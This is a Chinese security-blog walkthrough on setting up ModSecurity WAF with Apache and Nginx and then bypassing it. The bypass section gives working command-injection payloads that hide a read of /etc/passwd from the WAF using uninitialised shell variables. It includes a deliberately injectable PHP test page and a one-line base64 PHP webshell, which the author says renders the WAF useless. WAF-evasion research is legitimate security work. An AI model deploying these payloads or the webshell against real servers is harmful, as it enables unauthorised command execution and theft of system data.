<!DOCTYPE html>
<html>
<style>
.navbar-hide{
	display: none;
}
</style>
	<head>
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="© 关于哨兵，这是一个与哨兵安全相关的简述。">
<meta name="keywords" content="网络安全,哨兵安全,Cyber Security,Open Source">
<meta name="author" content="Sentry Security">
<link rel="shortcut icon" href="/static/img/favicon.png">
<title> Mod-Waf-Bypass-Walkthrough  © 关于哨兵 | 哨兵安全实验室</title>
<!--<base target="_blank" />-->
<link rel="stylesheet" href="/static/css/bootstrap.css">
<link rel="stylesheet" href="/static/css/bootstrap-select.min.css">
<link rel="stylesheet" href="/static/css/font-awesome.min.css" >
<link rel="stylesheet" href="/static/css/spinkit.css">
<link rel="stylesheet" href="/static/css/style.css">
<link rel="stylesheet" type="text/css" href="/static/css/pace-minimal.css">

<script src="/static/js/jquery.min.js"></script>
<!--jquery sticky js source files add-->
<script src="/static/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
<!--jquery sticky js source files add stop-->
<script src="/static/js/bootstrap.min.js"></script>
<script src="/static/js/bootstrap-select.min.js"></script>
<script src="/static/js/pace.min.js"></script>

<!--start-->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
        inlineMath: [['$$','$$']]
      }
    });
  </script>
<script src="/static/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
<!--https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js shuxue gongshi. stop-->

<script src="/static/js/vue.min.js"></script>
<script src="/static/js/timeago.min.js"></script>

<script src="/static/js/markup.min.js"></script>
<script src="/static/js/webfont.js"></script>
<script src="/static/js/thuhidden.js"></script>

</head>

<body>
	<div class="navbar navbar-default" role="navigation">
  <div class="container">
    <div class="navbar-header">
      
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      
			<a class="navbar-brand" href="/">
				<span class="thuhidden">
					
					<picture>
						
						<source 
						
							srcset="/static/img/logo-small-dark.png 1x,
											/static/img/logo-small-dark@2x.png 2x,
											/static/img/logo-small-dark@3x.png 3x,
											/static/img/logo-small-dark@4x.png 4x"
						
							media="(prefers-color-scheme: dark)"/>
						
						
						<img src="/static/img/logo-small.png" 
							srcset="/static/img/logo-small.png 1x, 
											/static/img/logo-small@2x.png 2x, 
											/static/img/logo-small@3x.png 3x, 
											/static/img/logo-small@4x.png 4x"
							alt=""/>
						
					</picture>
					
					</span>关于我的一些自述
			</a>
    </div>
    <div class="navbar-collapse collapse navbar-right">
      <ul class="nav navbar-nav" role="menubar">
        
        
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn">HOME</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/blog">BLOG</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/events">EVENT</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/categories">CATEGORIES</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/daily">DAILY</a></li>
        <li class="active"><a href="/">ABOUT ME</a></li>

        
       
      </ul>
    </div><!--/.nav-collapse -->
  </div>
</div>




<script>
	window.mirrorId = "Mod-Waf-Bypass-Walkthrough";
</script>


<div id="help-page">
	<div class="container">
	  <div class="row">
		  <div class="col-sm-3 hidden-xs">
				<ul class="nav nav-pills nav-stacked" id="help-nav">
					
					<li id="toc-ATT&CK - 基于 scylla 的访问代理池"><a href="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/"><code-index-css>ATT&CK - 基于 scylla 的访问代理池</code-index-css></a></li>
					
					<li id="toc-CTF - 代码审计向"><a href="/help/CTF-Code-Audit-WalkThrough/"><code-index-css>CTF - 代码审计向</code-index-css></a></li>
					
					<li id="toc-CTF - 密码学与杂项"><a href="/help/CTF-Crypto-and-Misc-etc-WalkThrough/"><code-index-css>CTF - 密码学与杂项</code-index-css></a></li>
					
					<li id="toc-Dynamic-analysis-of-java-framework-code"><a href="/help/Dynamic-analysis-of-java-framework-code/"><code-index-css>Dynamic-analysis-of-java-framework-code</code-index-css></a></li>
					
					<li id="toc-Hikvision-ConfigurationFiles-decrypter"><a href="/help/Hikvision-ConfigurationFiles-decrypter/"><code-index-css>Hikvision-ConfigurationFiles-decrypter</code-index-css></a></li>
					
					<li id="toc-JRMP-Gadget"><a href="/help/JRMP-Gadget/"><code-index-css>JRMP-Gadget</code-index-css></a></li>
					
					<li class="active" id="toc-Mod-Waf-Bypass-Walkthrough"><a href="/help/Mod-Waf-Bypass-Walkthrough/"><code-index-css>Mod-Waf-Bypass-Walkthrough</code-index-css></a></li>
					
					<li id="toc-ModSec & CloudFlare WAF Initial Research"><a href="/help/WAF-developed-by-Grayscale-forwarding/"><code-index-css>ModSec & CloudFlare WAF Initial Research</code-index-css></a></li>
					
					<li id="toc-Router-BinFile-Analysis"><a href="/help/Router-BinFile-Analysis/"><code-index-css>Router-BinFile-Analysis</code-index-css></a></li>
					
					<li id="toc-SQL注入原理分析"><a href="/help/ALL-SQL-INJECTION-ANALYSIS/"><code-index-css>SQL注入原理分析</code-index-css></a></li>
					
					<li id="toc-ShiroDeser"><a href="/help/ShiroDeser/"><code-index-css>ShiroDeser</code-index-css></a></li>
					
					<li id="toc-SpringBoot-Memory-files-heapdump-Analysis"><a href="/help/SpringBoot-Memory-files-heapdump-Analysis/"><code-index-css>SpringBoot-Memory-files-heapdump-Analysis</code-index-css></a></li>
					
					<li id="toc-Struts2Deser"><a href="/help/Struts2Deser/"><code-index-css>Struts2Deser</code-index-css></a></li>
					
					<li id="toc-javaDeser"><a href="/help/javaDeser/"><code-index-css>javaDeser</code-index-css></a></li>
					
					<li id="toc-polkit-CVE-2021-3560"><a href="/help/polkit-CVE-2021-3560/"><code-index-css>polkit-CVE-2021-3560</code-index-css></a></li>
					
					<li id="toc-基于内存的Shiro框架Webshell攻击研究"><a href="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/"><code-index-css>基于内存的Shiro框架Webshell攻击研究</code-index-css></a></li>
					
					<li id="toc-安全与开发之：Maven构建排错"><a href="/help/ALL-mvn-build-errors/"><code-index-css>安全与开发之：Maven构建排错</code-index-css></a></li>
					
					<li id="toc-浪潮ClusterEngineV4.0代码审计历程"><a href="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/"><code-index-css>浪潮ClusterEngineV4.0代码审计历程</code-index-css></a></li>
					
					<li id="toc-通达OA利用代码分析"><a href="/help/ToDa-OA-VulnPoc-by-java-analysis/"><code-index-css>通达OA利用代码分析</code-index-css></a></li>
					
				</ul>
				
				
				<div id="sticky-wrapper" class="sticky-wrapper" style="height: 200px;">
					<li class="nav nav-pills nav-stacked" id="help-nav">
						<code-index-css>
							<details open class="article-index" style="overflow: visible;">
								<summary class="point">文章目录&nbsp &nbsp</summary>
								<div class="hline"></div>
								<div class="spacing"></div>
								<ul id="toc" class="section-nav">
<li class="toc-entry toc-h1"><a href="#分享modsecwaf老牌开源waf的绕过历程">「分享」ModsecWAF：老牌开源waf的绕过历程</a>
<ul>
<li class="toc-entry toc-h2"><a href="#零连喊三声waf">零：连喊三声「WAF」</a>
<ul>
<li class="toc-entry toc-h3"><a href="#0x01-拿来waf">0x01 拿来WAF</a></li>
<li class="toc-entry toc-h3"><a href="#0x02-部署waf">0x02 部署WAF</a>
<ul>
<li class="toc-entry toc-h4"><a href="#-apache部署"># Apache部署</a></li>
<li class="toc-entry toc-h4"><a href="#-nginx部署"># Nginx部署</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x03-绕过waf">0x03 绕过WAF</a>
<ul>
<li class="toc-entry toc-h4"><a href="#-未初始变量进行绕过"># 未初始变量进行绕过</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#一编写poc脚本连接器">一：编写poc脚本连接器</a></li>
</ul>
</li>
</ul>
							</details>
						</code-index-css>
					</li>
				</div>
				 


				<!--click this icon -> scroll to top of page; code from anquanke. also this icon func are under-construction-->		
				<!-- <div class="back-to-top" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 500);" style="position: fixed;bottom:400px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
					<img src="https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
				</div> -->


			</div><!-- sidenave -->
			<div class="col-sm-9">
				<div class="visible-xs">
					<form class="form-inline">
						<div class="form-group">
							<label>选择: </label>
							<select class="form-control" id="help-select">
								
								<option data-help-url="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/" id="toc-ATT&CK - 基于 scylla 的访问代理池">ATT&CK - 基于 scylla 的访问代理池</option>
								
								<option data-help-url="/help/CTF-Code-Audit-WalkThrough/" id="toc-CTF - 代码审计向">CTF - 代码审计向</option>
								
								<option data-help-url="/help/CTF-Crypto-and-Misc-etc-WalkThrough/" id="toc-CTF - 密码学与杂项">CTF - 密码学与杂项</option>
								
								<option data-help-url="/help/Dynamic-analysis-of-java-framework-code/" id="toc-Dynamic-analysis-of-java-framework-code">Dynamic-analysis-of-java-framework-code</option>
								
								<option data-help-url="/help/Hikvision-ConfigurationFiles-decrypter/" id="toc-Hikvision-ConfigurationFiles-decrypter">Hikvision-ConfigurationFiles-decrypter</option>
								
								<option data-help-url="/help/JRMP-Gadget/" id="toc-JRMP-Gadget">JRMP-Gadget</option>
								
								<option data-help-url="/help/Mod-Waf-Bypass-Walkthrough/" selected id="toc-Mod-Waf-Bypass-Walkthrough">Mod-Waf-Bypass-Walkthrough</option>
								
								<option data-help-url="/help/WAF-developed-by-Grayscale-forwarding/" id="toc-ModSec & CloudFlare WAF Initial Research">ModSec & CloudFlare WAF Initial Research</option>
								
								<option data-help-url="/help/Router-BinFile-Analysis/" id="toc-Router-BinFile-Analysis">Router-BinFile-Analysis</option>
								
								<option data-help-url="/help/ALL-SQL-INJECTION-ANALYSIS/" id="toc-SQL注入原理分析">SQL注入原理分析</option>
								
								<option data-help-url="/help/ShiroDeser/" id="toc-ShiroDeser">ShiroDeser</option>
								
								<option data-help-url="/help/SpringBoot-Memory-files-heapdump-Analysis/" id="toc-SpringBoot-Memory-files-heapdump-Analysis">SpringBoot-Memory-files-heapdump-Analysis</option>
								
								<option data-help-url="/help/Struts2Deser/" id="toc-Struts2Deser">Struts2Deser</option>
								
								<option data-help-url="/help/javaDeser/" id="toc-javaDeser">javaDeser</option>
								
								<option data-help-url="/help/polkit-CVE-2021-3560/" id="toc-polkit-CVE-2021-3560">polkit-CVE-2021-3560</option>
								
								<option data-help-url="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/" id="toc-基于内存的Shiro框架Webshell攻击研究">基于内存的Shiro框架Webshell攻击研究</option>
								
								<option data-help-url="/help/ALL-mvn-build-errors/" id="toc-安全与开发之：Maven构建排错">安全与开发之：Maven构建排错</option>
								
								<option data-help-url="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/" id="toc-浪潮ClusterEngineV4.0代码审计历程">浪潮ClusterEngineV4.0代码审计历程</option>
								
								<option data-help-url="/help/ToDa-OA-VulnPoc-by-java-analysis/" id="toc-通达OA利用代码分析">通达OA利用代码分析</option>
								
							</select>
						</div>
					</form>
				</div>
				<div id="help-content">

				<center>
					
					<csmall>本文最后修改于：<em>2021-01-10</em></csmall>
					
				<csmall><em> | Sentry Security | 哨兵安全实验室</em></csmall>
				</center>

					<div class="hline"></div>
					<div class="spacing"></div>

					<h1 id="分享modsecwaf老牌开源waf的绕过历程">「分享」ModsecWAF：老牌开源waf的绕过历程</h1>

<h2 id="零连喊三声waf">零：连喊三声「WAF」</h2>

<h3 id="0x01-拿来waf">0x01 拿来WAF</h3>
<p>依稀记得高中的一位物理老师的一段话，就拿这段话来开始吧；背景是当时刚学物理课程，很多人学会物理公式仅限于会用，他们在课堂上对我们的物理老师表达出了焦虑。
当然，研究生学历的物理老师对于这种学习上的困扰必然是经历过，然后提出了下面的观点，原话记不太清了，所以只能大概表述出意思：</p>

<blockquote>
  <p>我知道你们现在有些迷茫，当然也是正常的。但是你们要想在某些领域上有所建树、突破，就要学会站在巨人的肩膀上看这个世界，鲁迅提出的拿来主义我觉得很适合用来学物理；
<strong>不管这些物理公式为什么是这样的、怎么得来的，先拿来用。</strong></p>
</blockquote>

<p>「拿来主义」：</p>
<blockquote>
  <p>是民国时期面对外来文化的冲击和中国封建时代遗留下来的文化，如何选择和取舍，于当时中国流行的闭关主义和全面西化的不同呼声；
<strong>鲁迅主张，既非被动地被“送去”，亦非不加分析地“拿来”，而是通过实用主义的观点选择性的“拿来”。</strong></p>
</blockquote>

<p>所以我想：针对WAF也可以这样来学习，不知道WAF的工作原理没有关系，我们先把开源的WAF拿过来用，用了才知道WAF的优点、缺点；</p>

<p>同样的：只有用过之后，我们看到拦截日志后可以知道WAF的正则表达规则库，可以对WAF的工作方式有一些了解。</p>

<h3 id="0x02-部署waf">0x02 部署WAF</h3>

<hr />

<h4 id="-apache部署"># Apache部署</h4>

<p><a href="https://zhuanlan.zhihu.com/p/104931385" target="_blank"><em>进一步了解：APACHE中间件链接ModSec</em></a></p>

<p>没什么好说的，跟着教程一步步走基本上都能搞定。直接上部署成功的图：
<img src="/static/web-image/waf/apache-modsec-waf.png" alt="waf-apache" />
如上图，部署成功后可以看到访问<code class="language-plaintext highlighter-rouge">http://localhost?doc=/bin/ls</code>，WAF给出拦截操作，日志记录提示触发了<code class="language-plaintext highlighter-rouge">unix-shell.data</code>规则导致拦截返回403；</p>

<h4 id="-nginx部署"># Nginx部署</h4>

<p><a href="https://zhuanlan.zhihu.com/p/80866123" target="_blank"><em>进一步了解：Nginx中间件链接ModSec</em></a></p>

<p><img src="/static/web-image/waf/nginx-modsec-waf.png" alt="waf-apache" />
同样的：访问<code class="language-plaintext highlighter-rouge">localhost:8011/?and 1=2--+</code>，触发WAF拦截规则返回403；需要注意的是：</p>
<ul>
  <li>nginx版本，教程中推荐的1.9版本实际操作下来无法成功编译安装，这里推荐<code class="language-plaintext highlighter-rouge">nginx/1.13.8</code>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">wget http://nginx.org/download/nginx-1.13.8.tar.gz</code></li>
    </ul>
  </li>
  <li>环境lib库安装：
    <ul>
      <li><code class="language-plaintext highlighter-rouge">sudo apt-get install openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev autoconf automake libtool gcc g++ make</code></li>
    </ul>
  </li>
  <li>[tips]以下四条命令的含义：
    <ul>
      <li>
        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-ie</span> <span class="s1">'s/SecDefaultAction "phase:1,log,auditlog,pass"/#SecDefaultAction "phase:1,log,auditlog,pass"/g'</span> crs-setup.conf
  <span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-ie</span> <span class="s1">'s/SecDefaultAction "phase:2,log,auditlog,pass"/#SecDefaultAction "phase:2,log,auditlog,pass"/g'</span> crs-setup.conf
  <span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-ie</span> <span class="s1">'s/#.*SecDefaultAction "phase:1,log,auditlog,deny,status:403"/SecDefaultAction "phase:1,log,auditlog,deny,status:403"/g'</span> crs-setup.conf
  <span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-ie</span> <span class="s1">'s/# SecDefaultAction "phase:2,log,auditlog,deny,status:403"/SecDefaultAction "phase:2,log,auditlog,deny,status:403"/g'</span> crs-setup.conf
</code></pre></div>        </div>
      </li>
      <li>将下面查看<code class="language-plaintext highlighter-rouge">crs-setup.conf</code>文件输出中1、2行（下文2、3行）的内容注释，文件中5、6行（下文6、7行）取消注释；
        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">cat </span>crs-setup.conf|grep SecDefaultAction
  <span class="c">#SecDefaultAction "phase:1,log,auditlog,pass"</span>
  <span class="c">#SecDefaultAction "phase:2,log,auditlog,pass"</span>
  <span class="c"># SecDefaultAction "phase:1,nolog,auditlog,pass"</span>
  <span class="c"># SecDefaultAction "phase:2,nolog,auditlog,pass"</span>
  SecDefaultAction <span class="s2">"phase:1,log,auditlog,deny,status:403"</span>
  SecDefaultAction <span class="s2">"phase:2,log,auditlog,deny,status:403"</span>
  <span class="c"># SecDefaultAction "phase:1,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host: %{request_headers.host}'"</span>
  <span class="c"># SecDefaultAction "phase:2,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host: %{request_headers.host}'"</span>
</code></pre></div>        </div>
        <p>其他根据教程往下走即可。</p>
      </li>
    </ul>
  </li>
</ul>

<h3 id="0x03-绕过waf">0x03 绕过WAF</h3>

<h4 id="-未初始变量进行绕过"># 未初始变量进行绕过</h4>
<p>跟随大佬们的脚步走，使用简单的php代码进行WAF测试：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
        <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nb">system</span><span class="p">(</span><span class="s1">'dig'</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]);</span>
        <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>如上代码尝试绕过WAF。我们知道终端执行<code class="language-plaintext highlighter-rouge">dig www.baidu.com;cat /etc/passwd</code>实际执行如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig www.baidu.com<span class="p">;</span><span class="nb">cat</span> /etc/passwd

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.10.6 &lt;&lt;<span class="o">&gt;&gt;</span> www.baidu.com
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 27659
;; flags: qr rd; QUERY: 1, ANSWER: 3, AUTHORITY: 5, ADDITIONAL: 4
;; WARNING: recursion requested but not available
···
···
···
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
··
··
_oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false
</span></code></pre></div></div>
<p>在终端下相同作用的链接符号还有<code class="language-plaintext highlighter-rouge">&amp;&amp;</code>；</p>

<p>直接传参<code class="language-plaintext highlighter-rouge">www.baidu.com;cat+/etc/passwd</code>注入明显的攻击行为直接返回403，查看日志匹配到以下特征：</p>
<ul>
  <li>1、<code class="language-plaintext highlighter-rouge">"Operator Rx' with parameter ^[\d.:]+$' against variable</code>，存在运算符；</li>
  <li>2、<code class="language-plaintext highlighter-rouge">Operator PmFromFile' with parameter lfi-os-files.data'</code>，正则匹配到lfi-os-files的规则库；</li>
  <li>3、<code class="language-plaintext highlighter-rouge">characters omitted</code>，特殊字符；</li>
  <li>4、<code class="language-plaintext highlighter-rouge">"Operator PmFromFile' with parameter unix-shell.data'</code>，正则匹配到unix-shell的规则库；</li>
  <li>5、<code class="language-plaintext highlighter-rouge">Operator Ge' with parameter 5'</code>，同样为存在运算符。
所以根据以上特征进行规则探测并注入fuzz：</li>
</ul>

<hr />

<ul>
  <li><code class="language-plaintext highlighter-rouge">+$u+cat+/$uetc/$upasswd$u</code></li>
  <li><code class="language-plaintext highlighter-rouge">+$ucat+$u/etc$u/passwd</code>
以上都返回200，但是没有回显，说明命令写的不对；</li>
</ul>

<p>实际测试<code class="language-plaintext highlighter-rouge">/etc</code>、<code class="language-plaintext highlighter-rouge">/passwd</code>和特殊字符等不能单独出现，所以使用未初始变量<code class="language-plaintext highlighter-rouge">$u</code>包住后进行注入；
下面是实际生效的payload：</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">+$u+cat+/etc$u/passwd$u</code></li>
  <li><code class="language-plaintext highlighter-rouge">+$u+cat+$u/etc$u/passwd</code>
<img src="/static/web-image/waf/waf-bypass-exec-command.png" alt="waf-bypass-exec" /></li>
</ul>

<h2 id="一编写poc脚本连接器">一：编写poc脚本连接器</h2>

<p>通过以上绕过首发即可执行任意代码，我们可以直接写入一句话木马，但是这不是本段的重点；</p>

<p>本段的重点是通过实际测试发现base64编码后可以完美绕过waf，所以可以直接写入一个base64的马，然后连接，实际上就是解决实现一个webshell连接器，实现
功能类似一个蚁剑的cmd连接功能；这样以来WAF就形同虚设了。
webshell代码：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'CMD'</span><span class="p">]));</span><span class="cp">?&gt;</span>
</code></pre></div></div>
<ul>
  <li>GET/POST请求传入cmd</li>
  <li>base64加密参数内容</li>
  <li>类似终端执行代码
实现效果如下：
<img src="/static/web-image/waf/waf-bypass-shell.png" alt="waf-bypass-shell" />
参考的是[@IppSec]的代码，简单修改了部分。
<a href="https://github.com/IppSec/forward-shell/blob/master/forward-shell.py" target="_blank">参考代码</a></li>
</ul>

<hr />

<p>以上</p>


				</div>
				<div class="spacing"></div>
	            <div>
	<div class="hline"></div>
	<h3><em>#</em> 申明</h3>
	<div class="spacing"></div>
	<h4><em>By: Bin4xin.</em></h4>
	<h4>转载请申明本文链接：<a href="/help/Mod-Waf-Bypass-Walkthrough/" target="_blank"><code-index-css>《<em>Modsec Waf Bypass</em>》</code-index-css></a></h4>

	<h3><em># Any Questions</em></h3>
	<div class="spacing"></div>
	<h4> >_ 对本文进行提问：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://github.com/Bin4xin/bin4xin.github.io/blob/1b4fffa6232dc6ffa2cece8be0d6c39e0c5f9cfe/help/Mod-Waf-Bypass-Walkthrough/index.html%23L84" target="_blank"> <em><li class="fa fa-github"></li> Reference in new issue.</em></a></h4>

	<h4> >_ 对本文进行留言：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://about.sentrylab.cn/help/Mod-Waf-Bypass-Walkthrough/" target="_blank"> <em><li class="fa fa-github"></li> Leave a Comment.</em></a></h4>
</div>
			</div><!-- help content -->
	  </div>
	</div><!--/container -->
</div><!--/mirrors -->
	


<div id="footerwrap" class="tuna-foot-1">
<div class="container">
    <div class="row">
            <div class="col-sm-4">
                <div class="col-sm-6">
                  <p class="thuhidden"><strong>入门</strong></p>
                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>源码</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">博客搭建教程</a></p>
                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></p>
                  </div>

                  <div class="col-sm-6">
                  <p class="thuhidden"><strong>社区</strong></p>
                  <p class="thuhidden"><a href="/blog" target="blank">博客</a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
                  </div>
            </div>

            <div class="col-sm-4">
                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>开发</strong></p>
                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
                    <p class="share">
                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
                    </p>
                  </div>

                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>关于</strong></p>
                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">近期研究</a></p>
                    <p class="thuhidden">∑ <csmall>(Visitors/times)</csmall></em></p>
                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
                  </div>
            </div>

        <div class="col-sm-4">
          
          <img src="/static/img/logo-small@3x.png" />

        </div>
    </div><!--/row -->
    
    <p class="thuhidden">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>

  </div>
</div>




<div id="footerwrap" class="tuna-foot-2">
<div class="container">
    <div class="row">
            <div class="col-sm-4">
                <div class="col-sm-6">
                  <p class="thuhidden"><strong>入门</strong></p>
                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>源码</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">博客搭建教程</a></p>
                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></p>
                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></p>
                  </div>

                  <div class="col-sm-6">
                  <p class="thuhidden"><strong>社区</strong></p>
                  <p class="thuhidden"><a href="/blog" target="blank">博客</a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
                  </div>
            </div>

            <div class="col-sm-4">
                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>开发</strong></p>
                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
                    <p class="share">
                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
                    </p>
                  </div>

                  <div class="col-sm-6">
                    <p class="thuhidden"><strong>关于</strong></p>
                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">近期研究</a></p>
                    <p class="thuhidden">∑ <csmall>(Visitors/times)</csmall></em></p>
                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
                  </div>
            </div>

        <div class="col-sm-4">
          
          <img src="/static/img/logo-small@3x.png" />

        </div>
    </div><!--/row -->
    
    <p class="thuhidden">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>

  </div>
</div>


</body>

<script src="/static/js/help.js"></script>
</html>
<!--
vim: ts=2 sts=2 sw=2 noexpandtab
-->
